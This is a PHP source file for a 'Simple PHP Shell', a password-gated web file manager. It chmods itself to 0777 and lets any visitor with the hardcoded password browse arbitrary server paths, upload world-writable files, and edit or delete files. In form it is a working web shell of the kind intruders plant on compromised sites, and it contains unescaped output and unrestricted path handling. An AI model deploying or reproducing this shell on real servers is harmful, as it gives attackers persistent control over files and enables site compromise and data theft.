<?php
// === Auto chmod 0777 itself ===
@chmod(__FILE__, 0777);

// === Basic auth (change this!) ===
$pass = "alone"; // ← CHANGE THIS PASSWORD
if (!isset($_REQUEST['p']) || $_REQUEST['p'] !== $pass) {
    die('<title>Login</title><form>Pass: <input name="p" type="password" autofocus><input type="submit"></form>');
}

// === Functions ===
function perms($f){ $p = substr(sprintf('%o', fileperms($f)),-4); return "<span style='color:".($p=='0777'?'lime':'yellow')."'>$p</span>"; }
function human_size($b){ $s=['B','KB','MB','GB']; foreach($s as $i=>$u) if($b<1024) return round($b,2).$u; $b/=1024; return human_size($b); }

// Current path
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$dir = realpath($dir) ?: getcwd();
chdir($dir);

// === Actions ===
if(isset($_POST['newfile'])){ file_put_contents($_POST['newfile'],""); }
if(isset($_POST['newfolder'])){ mkdir($_POST['newfolder'],0777,true); }
if(isset($_GET['del'])){ is_file($_GET['del'])?unlink($_GET['del']):@rmdir($_GET['del']); }
if(isset($_POST['save'])){ file_put_contents($_POST['file'],$_POST['content']); }
if(isset($_FILES['upfile']) && $_FILES['upfile']['error']==0){
    move_uploaded_file($_FILES['upfile']['tmp_name'], $_FILES['upfile']['name']);
    @chmod($_FILES['upfile']['name'],0777);
}

// === Header ===
echo '<pre style="font:12px monospace;background:#000;color:lime;padding:10px;">';
echo "<b>Simple PHP Shell</b> | <a href='?dir=".urlencode(dirname($dir))."&p=$pass'>..</a> <b>Current:</b> ".htmlspecialchars($dir)."<hr>";

// === Upload + Create ===
echo '<form enctype="multipart/form-data" method="post"><input type="file" name="upfile"> <input type="submit" value="Upload"></form>';
echo '<form method="post">New file: <input name="newfile" size="30"> <input type="submit" value="Create"></form>';
echo '<form method="post">New folder: <input name="newfolder" size="30"> <input type="submit" value="Create"></form><hr>';

// === List files & folders ===
echo "<table width='100%'><tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>";
foreach(scandir('.') as $f){
    if($f=='.' || $f=='..') continue;
    $path = "$dir/$f";
    $isdir = is_dir($path);
    echo "<tr>
        <td>".($isdir?"<b>":"")."<a href='?dir=".urlencode($path)."&p=$pass'>$f</a>".($isdir?" /":"")."</td>
        <td>".($isdir?"&lt;DIR&gt;":human_size(filesize($path)))."</td>
        <td>".perms($path)."</td>
        <td>
            <a href='?edit=".urlencode($path)."&p=$pass'>Edit</a> |
            <a href='?del=".urlencode($path)."&p=$pass' onclick=\"return confirm('Delete $f?')\">Del</a>
        </td>
    </tr>";
}
echo "</table><hr>";

// === Edit file ===
if(isset($_GET['edit'])){
    $file = $_GET['edit'];
    $content = isset($_POST['content']) ? $_POST['content'] : file_get_contents($file);
    echo "<form method='post'>
        <b>Editing: ".htmlspecialchars($file)."</b><br>
        <textarea name='content' style='width:100%;height:400px;background:#111;color:lime;'>".htmlspecialchars($content)."</textarea><br>
        <input type='hidden' name='file' value='$file'>
        <input type='submit' name='save' value='Save & Exit'>
    </form>";
}
echo '</pre>';
?>
